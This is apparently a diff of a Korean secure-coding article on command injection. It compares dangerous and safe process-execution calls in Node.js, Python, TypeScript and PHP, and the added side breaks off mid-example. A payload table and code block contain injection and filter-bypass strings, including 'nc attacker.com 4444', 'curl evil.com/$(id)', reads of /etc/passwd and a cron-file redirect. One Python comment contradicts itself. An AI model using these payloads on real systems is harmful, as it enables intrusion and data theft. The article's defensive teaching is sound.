-    앱--&gt;&gt;공격자: 응답에 passwd 노출</code></pre> <p>이 다이어그램의 핵심은 "셸이 한 번 끼어든다"는 사실이다. 셸을 빼면 공격이 성립하지 않는다.</p> <hr> <h2 id=위험한-함수와-안전한-함수>위험한 함수와 안전한 함수<a class=headerlink href=#위험한-함수와-안전한-함수 title="Permanent link">&para;</a></h2> <p>언어마다 셸을 거치는 함수와 거치지 않는 함수가 분리되어 있다. 이걸 구분하지 못하면 방어 자체가 불가능하다.</p> <h3 id=nodejs>Node.js<a class=headerlink href=#nodejs title="Permanent link">&para;</a></h3> <div class="language-javascript highlight"><pre><span></span><code><span id=__span-1-1><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=kd>const</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nx>exec</span><span class=p>,</span><span class=w> </span><span class=nx>execFile</span><span class=p>,</span><span class=w> </span><span class=nx>spawn</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>);</span>
-</span><span id=__span-1-2><a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>
-</span><span id=__span-1-3><a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=c1>// 위험 — 인자를 셸 문자열로 합쳐서 /bin/sh -c 로 실행한다</span>
-</span><span id=__span-1-4><a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=nx>exec</span><span class=p>(</span><span class=sb>`convert </span><span class=si>${</span><span class=nx>filename</span><span class=si>}</span><span class=sb> output.webp`</span><span class=p>,</span><span class=w> </span><span class=nx>callback</span><span class=p>);</span>
-</span><span id=__span-1-5><a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a>
-</span><span id=__span-1-6><a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a><span class=c1>// 안전 — 셸을 거치지 않고 바이너리에 인자 배열을 직접 넘긴다</span>
-</span><span id=__span-1-7><a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=nx>execFile</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>],</span><span class=w> </span><span class=nx>callback</span><span class=p>);</span>
-</span><span id=__span-1-8><a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a>
-</span><span id=__span-1-9><a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a><span class=c1>// 안전 — spawn도 기본은 셸 미사용</span>
-</span><span id=__span-1-10><a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a><span class=nx>spawn</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>]);</span>
-</span><span id=__span-1-11><a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a>
-</span><span id=__span-1-12><a id=__codelineno-1-12 name=__codelineno-1-12 href=#__codelineno-1-12></a><span class=c1>// 다시 위험 — spawn에 shell:true 옵션을 주면 exec와 같아진다</span>
-</span><span id=__span-1-13><a id=__codelineno-1-13 name=__codelineno-1-13 href=#__codelineno-1-13></a><span class=nx>spawn</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>],</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nx>shell</span><span class=o>:</span><span class=w> </span><span class=kc>true</span><span class=w> </span><span class=p>});</span>
-</span></code></pre></div> <p><code>exec</code>와 <code>execFile</code>의 차이를 모르고 쓰는 코드가 정말 많다. 파라미터 시그니처가 비슷해서 IDE 자동완성으로 잘못 고른 코드도 자주 본다. 코드 리뷰 시 <code>exec(</code> 호출은 반드시 변수가 들어가는지 봐야 한다.</p> <h3 id=python>Python<a class=headerlink href=#python title="Permanent link">&para;</a></h3> <div class="language-python highlight"><pre><span></span><code><span id=__span-2-1><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=kn>import</span><span class=w> </span><span class=nn>subprocess</span>
-</span><span id=__span-2-2><a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>
-</span><span id=__span-2-3><a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a><span class=c1># 위험 — shell=True 일 때 첫 인자가 셸 문자열로 처리된다</span>
-</span><span id=__span-2-4><a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a><span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;convert </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2> output.webp&quot;</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
-</span><span id=__span-2-5><a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>
-</span><span id=__span-2-6><a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a><span class=c1># 위험 — os.system은 항상 셸을 거친다</span>
-</span><span id=__span-2-7><a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;convert </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2> output.webp&quot;</span><span class=p>)</span>
-</span><span id=__span-2-8><a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a>
-</span><span id=__span-2-9><a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a><span class=c1># 안전 — shell=False(기본값), 인자를 리스트로 분리</span>
-</span><span id=__span-2-10><a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a><span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s2>&quot;convert&quot;</span><span class=p>,</span> <span class=n>filename</span><span class=p>,</span> <span class=s2>&quot;output.webp&quot;</span><span class=p>])</span>
-</span><span id=__span-2-11><a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a>
-</span><span id=__span-2-12><a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a><span class=c1># 안전 — 인자가 배열이지만 shell=True면 다시 위험해진다</span>
-</span><span id=__span-2-13><a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a><span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s2>&quot;convert&quot;</span><span class=p>,</span> <span class=n>filename</span><span class=p>,</span> <span class=s2>&quot;output.webp&quot;</span><span class=p>],</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>  <span class=c1># 이 경우 filename만 사용되고 나머지는 무시되며 셸로 들어간다</span>
-</span></code></pre></div> <p>마지막 케이스가 특히 함정이다. <code>shell=True</code>이면서 인자가 리스트일 때, 파이썬은 첫 번째 요소만 셸에 넘기고 나머지는 셸의 <code>$0</code>, <code>$1</code> 위치 인자로 들어간다. 의도와 전혀 다른 동작이지만 에러가 나지 않아 발견이 늦다.</p> <h3 id=typescript-nodejs>TypeScript (Node.js)<a class=headerlink href=#typescript-nodejs title="Permanent link">&para;</a></h3> <div class="language-typescript highlight"><pre><span></span><code><span id=__span-3-1><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=k>import</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nx>execFile</span><span class=p>,</span><span class=w> </span><span class=nx>spawn</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=kr>from</span><span class=w> </span><span class=s1>&#39;child_process&#39;</span><span class=p>;</span>
-</span><span id=__span-3-2><a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a><span class=k>import</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nx>promisify</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=kr>from</span><span class=w> </span><span class=s1>&#39;util&#39;</span><span class=p>;</span>
-</span><span id=__span-3-3><a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>
-</span><span id=__span-3-4><a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a><span class=kd>const</span><span class=w> </span><span class=nx>execFileAsync</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nx>promisify</span><span class=p>(</span><span class=nx>execFile</span><span class=p>);</span>
-</span><span id=__span-3-5><a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>
-</span><span id=__span-3-6><a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a><span class=c1>// 위험 — exec(문자열)는 /bin/sh -c 로 실행된다</span>
-</span><span id=__span-3-7><a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a><span class=k>import</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nx>exec</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=kr>from</span><span class=w> </span><span class=s1>&#39;child_process&#39;</span><span class=p>;</span>
-</span><span id=__span-3-8><a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a><span class=nx>exec</span><span class=p>(</span><span class=sb>`convert </span><span class=si>${</span><span class=nx>filename</span><span class=si>}</span><span class=sb> output.webp`</span><span class=p>,</span><span class=w> </span><span class=nx>callback</span><span class=p>);</span>
-</span><span id=__span-3-9><a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a>
-</span><span id=__span-3-10><a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a><span class=c1>// 안전 — execFile: 셸 경유 없이 바이너리에 인자 배열을 직접 넘긴다</span>
-</span><span id=__span-3-11><a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a><span class=nx>execFile</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>],</span><span class=w> </span><span class=nx>callback</span><span class=p>);</span>
-</span><span id=__span-3-12><a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a><span class=c1>// 또는 async/await</span>
-</span><span id=__span-3-13><a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a><span class=kd>const</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nx>stdout</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>await</span><span class=w> </span><span class=nx>execFileAsync</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>]);</span>
-</span><span id=__span-3-14><a id=__codelineno-3-14 name=__codelineno-3-14 href=#__codelineno-3-14></a>
-</span><span id=__span-3-15><a id=__codelineno-3-15 name=__codelineno-3-15 href=#__codelineno-3-15></a><span class=c1>// 안전 — spawn도 기본은 셸 미사용</span>
-</span><span id=__span-3-16><a id=__codelineno-3-16 name=__codelineno-3-16 href=#__codelineno-3-16></a><span class=nx>spawn</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>]);</span>
-</span><span id=__span-3-17><a id=__codelineno-3-17 name=__codelineno-3-17 href=#__codelineno-3-17></a>
-</span><span id=__span-3-18><a id=__codelineno-3-18 name=__codelineno-3-18 href=#__codelineno-3-18></a><span class=c1>// 다시 위험 — shell:true 옵션을 주면 exec와 동일해진다</span>
-</span><span id=__span-3-19><a id=__codelineno-3-19 name=__codelineno-3-19 href=#__codelineno-3-19></a><span class=nx>spawn</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>],</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nx>shell</span><span class=o>:</span><span class=w> </span><span class=kt>true</span><span class=w> </span><span class=p>});</span>
-</span></code></pre></div> <p><code>exec</code>는 문자열 하나를 셸에 넘기기 때문에 <code>filename</code>에 메타문자가 들어가면 인젝션이 발생한다. <code>execFile</code>은 바이너리와 인자를 분리해서 넘기므로 셸 해석 자체가 일어나지 않는다. <code>execFile</code>과 <code>spawn</code>은 <code>shell: true</code> 옵션이 없는 한 안전하다.</p> <h3 id=php>PHP<a class=headerlink href=#php title="Permanent link">&para;</a></h3> <div class="language-php highlight"><pre><span></span><code><span id=__span-4-1><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=x>// 위험 — 모두 셸을 거친다</span>
-</span><span id=__span-4-2><a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a><span class=x>system(&quot;convert $filename output.webp&quot;);</span>
-</span><span id=__span-4-3><a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a><span class=x>exec(&quot;convert $filename output.webp&quot;);</span>
-</span><span id=__span-4-4><a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a><span class=x>shell_exec(&quot;convert $filename output.webp&quot;);</span>
-</span><span id=__span-4-5><a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a><span class=x>passthru(&quot;convert $filename output.webp&quot;);</span>
-</span><span id=__span-4-6><a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a><span class=x>$output = `convert $filename output.webp`;  // 백틱 연산자도 마찬가지</span>
-</span><span id=__span-4-7><a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a>
-</span><span id=__span-4-8><a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a><span class=x>// 그나마 안전 — 인자 단위로 escapeshellarg를 거쳐야 함</span>
-</span><span id=__span-4-9><a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a><span class=x>$cmd = &quot;convert &quot; . escapeshellarg($filename) . &quot; output.webp&quot;;</span>
-</span><span id=__span-4-10><a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a><span class=x>exec($cmd);</span>
-</span><span id=__span-4-11><a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a>
-</span><span id=__span-4-12><a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a><span class=x>// 더 안전 — proc_open + 파이프 디스크립터 직접 제어</span>
-</span></code></pre></div> <p>PHP는 백틱 문자열 자체가 셸 실행 연산자라 한 번에 알아보기 어렵다. 코드 리뷰 시 <code>`</code> 문자가 변수와 함께 있는 패턴을 grep해야 한다.</p> <hr> <h2 id=메타문자-페이로드-패턴>메타문자 페이로드 패턴<a class=headerlink href=#메타문자-페이로드-패턴 title="Permanent link">&para;</a></h2> <p>셸이 해석하는 메타문자를 알면 공격자가 무엇을 시도하는지 보인다. 방어 코드를 작성할 때도 이 목록을 기준으로 검증한다.</p> <table> <thead> <tr> <th>메타문자</th> <th>의미</th> <th>페이로드 예시</th> </tr> </thead> <tbody> <tr> <td><code>;</code></td> <td>명령 순차 실행</td> <td><code>image.jpg; cat /etc/passwd</code></td> </tr> <tr> <td><code>&amp;&amp;</code></td> <td>앞 명령 성공 시 다음 실행</td> <td><code>image.webp &amp;&amp; id</code></td> </tr> <tr> <td><code>\|\|</code></td> <td>앞 명령 실패 시 다음 실행</td> <td><code>nonexistent \|\| whoami</code></td> </tr> <tr> <td><code>\|</code></td> <td>파이프 (앞 출력 → 뒤 입력)</td> <td><code>image.webp \| nc attacker.com 4444</code></td> </tr> <tr> <td><code>&amp;</code></td> <td>백그라운드 실행</td> <td><code>image.webp &amp; curl evil.com/$(id)</code></td> </tr> <tr> <td><code>`cmd`</code></td> <td>명령 치환 (구식)</td> <td><code>image`whoami`.webp</code></td> </tr> <tr> <td><code>$(cmd)</code></td> <td>명령 치환 (현대)</td> <td><code>image$(whoami).webp</code></td> </tr> <tr> <td><code>&lt;(cmd)</code></td> <td>프로세스 치환</td> <td><code>&lt;(curl evil.com/sh)</code></td> </tr> <tr> <td><code>&gt;</code> <code>&gt;&gt;</code></td> <td>출력 리다이렉트</td> <td><code>image.webp &gt; /etc/cron.d/x</code></td> </tr> <tr> <td><code>\n</code></td> <td>명령 줄바꿈</td> <td><code>image.jpg\ncat /etc/passwd</code></td> </tr> <tr> <td><code>${IFS}</code></td> <td>공백 우회</td> <td><code>cat${IFS}/etc/passwd</code></td> </tr> </tbody> </table> <p>실무에서 자주 보는 우회 기법은 다음 두 가지다. 첫째, 공백을 <code>${IFS}</code>로 치환해서 단순 공백 차단을 우회한다. 둘째, 백슬래시로 메타문자를 끊어서 정규식 차단을 회피한다(<code>c\at /etc/passwd</code>).</p> <div class="language-bash highlight"><pre><span></span><code><span id=__span-5-1><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=c1># 공백 차단을 우회하는 페이로드</span>
-</span><span id=__span-5-2><a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=o>{</span>cat,/etc/passwd<span class=o>}</span>
-</span><span id=__span-5-3><a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a>cat<span class=nv>$IFS</span>/etc/passwd
-</span><span id=__span-5-4><a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a>cat<span class=o>&lt;&lt;&lt;</span><span class=k>$(</span>cat<span class=w> </span>/etc/passwd<span class=k>)</span>
-</span><span id=__span-5-5><a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a>
-</span><span id=__span-5-6><a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a><span class=c1># 점이나 슬래시 차단을 우회</span>
-</span><span id=__span-5-7><a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a>/???/p?sswd<span class=w>          </span><span class=c1># 글로빙</span>
-</span><span id=__span-5-8><a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=k>$(</span><span class=nb>printf</span><span class=w> </span><span class=s1>&#39;\x2fetc\x2fpasswd&#39;</span><span class=k>)</span><span class=w>  </span><span class=c1># 16진수 인코딩</span>
-</span></code></pre></div> <p>이런 우회를 일일이 막으려고 블록리스트를 쌓는 건 의미가 없다. 셸 자체를 호출하지 않는 게 유일한 정답이다.</p> <hr> <h2 id=파일-업로드--명령-인젝션-콤보>파일 업로드 + 명령 인젝션 콤보<a class=headerlink href=#파일-업로드--명령-인젝션-콤보 title="Permanent link">&para;</a></h2> <p>가장 자주 발생하는 실전 시나리오다. 단독 명령 인젝션보다 파일 업로드와 결합된 형태가 훨씬 흔하다.</p> <pre class=mermaid-diagram><code>flowchart LR
+    앱--&gt;&gt;공격자: 응답에 passwd 노출</code></pre>
+<p>이 다이어그램의 핵심은 "셸이 한 번 끼어든다"는 사실이다. 셸을 빼면 공격이 성립하지 않는다.</p>
+<hr />
+<h2 id="위험한-함수와-안전한-함수">위험한 함수와 안전한 함수<a class="headerlink" href="#위험한-함수와-안전한-함수" title="Permanent link">&para;</a></h2>
+<p>언어마다 셸을 거치는 함수와 거치지 않는 함수가 분리되어 있다. 이걸 구분하지 못하면 방어 자체가 불가능하다.</p>
+<h3 id="nodejs">Node.js<a class="headerlink" href="#nodejs" title="Permanent link">&para;</a></h3>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">exec</span><span class="p">,</span><span class="w"> </span><span class="nx">execFile</span><span class="p">,</span><span class="w"> </span><span class="nx">spawn</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">);</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1">// 위험 — 인자를 셸 문자열로 합쳐서 /bin/sh -c 로 실행한다</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nx">exec</span><span class="p">(</span><span class="sb">`convert </span><span class="si">${</span><span class="nx">filename</span><span class="si">}</span><span class="sb"> output.webp`</span><span class="p">,</span><span class="w"> </span><span class="nx">callback</span><span class="p">);</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="c1">// 안전 — 셸을 거치지 않고 바이너리에 인자 배열을 직접 넘긴다</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="nx">execFile</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">],</span><span class="w"> </span><span class="nx">callback</span><span class="p">);</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1">// 안전 — spawn도 기본은 셸 미사용</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">]);</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="c1">// 다시 위험 — spawn에 shell:true 옵션을 주면 exec와 같아진다</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">],</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">shell</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span>
+</span></code></pre></div>
+<p><code>exec</code>와 <code>execFile</code>의 차이를 모르고 쓰는 코드가 정말 많다. 파라미터 시그니처가 비슷해서 IDE 자동완성으로 잘못 고른 코드도 자주 본다. 코드 리뷰 시 <code>exec(</code> 호출은 반드시 변수가 들어가는지 봐야 한다.</p>
+<h3 id="python">Python<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># 위험 — shell=True 일 때 첫 인자가 셸 문자열로 처리된다</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;convert </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2"> output.webp&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c1"># 위험 — os.system은 항상 셸을 거친다</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;convert </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2"> output.webp&quot;</span><span class="p">)</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c1"># 안전 — shell=False(기본값), 인자를 리스트로 분리</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&quot;convert&quot;</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="s2">&quot;output.webp&quot;</span><span class="p">])</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="c1"># 안전 — 인자가 배열이지만 shell=True면 다시 위험해진다</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&quot;convert&quot;</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="s2">&quot;output.webp&quot;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1"># 이 경우 filename만 사용되고 나머지는 무시되며 셸로 들어간다</span>
+</span></code></pre></div>
+<p>마지막 케이스가 특히 함정이다. <code>shell=True</code>이면서 인자가 리스트일 때, 파이썬은 첫 번째 요소만 셸에 넘기고 나머지는 셸의 <code>$0</code>, <code>$1</code> 위치 인자로 들어간다. 의도와 전혀 다른 동작이지만 에러가 나지 않아 발견이 늦다.</p>
+<h3 id="typescript-nodejs">TypeScript (Node.js)<a class="headerlink" href="#typescript-nodejs" title="Permanent link">&para;</a></h3>
+<div class="language-typescript highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">execFile</span><span class="p">,</span><span class="w"> </span><span class="nx">spawn</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s1">&#39;child_process&#39;</span><span class="p">;</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">promisify</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s1">&#39;util&#39;</span><span class="p">;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="kd">const</span><span class="w"> </span><span class="nx">execFileAsync</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">promisify</span><span class="p">(</span><span class="nx">execFile</span><span class="p">);</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="c1">// 위험 — exec(문자열)는 /bin/sh -c 로 실행된다</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">exec</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s1">&#39;child_process&#39;</span><span class="p">;</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="nx">exec</span><span class="p">(</span><span class="sb">`convert </span><span class="si">${</span><span class="nx">filename</span><span class="si">}</span><span class="sb"> output.webp`</span><span class="p">,</span><span class="w"> </span><span class="nx">callback</span><span class="p">);</span>
